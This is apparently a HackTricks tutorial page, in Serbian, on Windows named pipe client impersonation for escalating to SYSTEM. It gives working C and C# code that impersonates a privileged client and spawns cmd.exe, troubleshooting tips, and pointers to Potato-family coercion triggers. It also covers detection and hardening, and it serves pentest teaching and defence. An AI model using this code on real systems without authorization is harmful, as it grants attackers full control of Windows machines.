# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation je lokalni primitive za eskalaciju privilegija koji omogućava delu server niti named-pipe-a da prihvati sigurnosni kontekst klijenta koji se poveže na njega. U praksi, napadač koji može da izvršava kod sa SeImpersonatePrivilege može prinuditi privilegovani klijent (npr. SYSTEM service) da se poveže na pipe koji kontroliše napadač, pozove ImpersonateNamedPipeClient, duplicira dobijeni token u primary token i pokrene proces kao taj klijent (često NT AUTHORITY\SYSTEM).

Ova stranica se fokusira na samu tehniku. Za end-to-end exploit lancеve koji primoravaju SYSTEM da se poveže na vaš pipe, pogledajte Potato family stranice referencirane ispod.

## TL;DR
- Kreirajte named pipe: \\.\pipe\<random> i čekajte konekciju.
- Naterajte privilegovanu komponentu da se poveže na njega (spooler/DCOM/EFSRPC/etc.).
- Pročitajte bar jednu poruku iz pipe-a, pa pozovite ImpersonateNamedPipeClient.
- Otvorite impersonation token iz tekućeg threada, DuplicateTokenEx(TokenPrimary) i CreateProcessWithTokenW/CreateProcessAsUser da dobijete SYSTEM proces.

## Requirements and key APIs
- Privileges koje obično treba imati pozivajući proces/thread:
- SeImpersonatePrivilege da uspešno impersonirate konektovanog klijenta i da koristite CreateProcessWithTokenW.
- Alternativno, nakon impersoniranja SYSTEM-a, možete koristiti CreateProcessAsUser, što može zahtevati SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (ovo je zadovoljeno dok impersonirate SYSTEM).
- Core APIs koji se koriste:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (mora se pročitati bar jedna poruka pre impersonacije)
- ImpersonateNamedPipeClient i RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ili CreateProcessAsUser
- Imersonation level: da biste izveli korisne akcije lokalno, klijent mora dozvoliti SecurityImpersonation (podrazumevano za mnoge lokalne RPC/named-pipe klijente). Klijenti mogu smanjiti ovo korišćenjem SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION pri otvaranju pipe-a.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Napomene:
- Ako ImpersonateNamedPipeClient vrati ERROR_CANNOT_IMPERSONATE (1368), pobrinite se da najpre pročitate iz pipe i da klijent nije ograničio impersonaciju na Identification level.
- Preferirajte DuplicateTokenEx sa SecurityImpersonation i TokenPrimary da biste kreirali primary token pogodan za pokretanje procesa.

## .NET kratak primer
U .NET-u, NamedPipeServerStream može da impersonira preko RunAsClient. Kada impersonirate, duplicirajte thread token i kreirajte proces.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Uobičajeni okidači/prisiljavanja da dovedete SYSTEM do vašeg named pipe
Ove tehnike prouzrokuju da privilegovani servisi uspostave konekciju na vaš named pipe tako da možete da ih impersonirate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Pogledajte detaljnu upotrebu i kompatibilnost ovde:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Ako vam treba kompletan primer kreiranja pipe-a i impersonacije da spawn-ujete SYSTEM iz service okidača, pogledajte:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Otklanjanje problema i zamke
- Morate pročitati bar jednu poruku iz pipe-a pre poziva ImpersonateNamedPipeClient; inače ćete dobiti ERROR_CANNOT_IMPERSONATE (1368).
- Ako se klijent poveže koristeći SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server ne može u potpunosti impersonirati; proverite nivo impersonacije tokena preko GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW zahteva SeImpersonatePrivilege na pozivaocu. Ako to padne sa ERROR_PRIVILEGE_NOT_HELD (1314), koristite CreateProcessAsUser nakon što ste već impersonirali SYSTEM.
- Obezbedite da security descriptor vašeg pipe-a dozvoljava ciljnom servisu da se poveže ako ga učvrstite; podrazumevano su pipe-ovi pod \\.\pipe dostupni u skladu sa DACL servera.

## Detekcija i hardening
- Pratite kreiranje i konekcije named pipe-ova. Sysmon Event IDs 17 (Pipe Created) i 18 (Pipe Connected) su korisni za baseline legitimnih imena pipe-ova i detekciju neuobičajenih, nasumičnih pipe-ova koji prethode token-manipulation events.
- Tražite sekvence: proces kreira pipe, SYSTEM servis se poveže, zatim proces koji je kreirao spawn-uje child kao SYSTEM.
- Smanjite izloženost uklanjanjem SeImpersonatePrivilege sa nebitnih servisnih naloga i izbegavanjem nepotrebnih service logon-ova sa visokim privilegijama.
- Defensive development: pri povezivanju na nepoverljive named pipe-ove, navedite SECURITY_SQOS_PRESENT sa SECURITY_IDENTIFICATION da sprečite servere da u potpunosti impersoniraju klijenta osim ako nije neophodno.

## References
- Windows: ImpersonateNamedPipeClient dokumentacija (zahtevi i ponašanje impersonacije). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (uputstvo i primeri koda). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
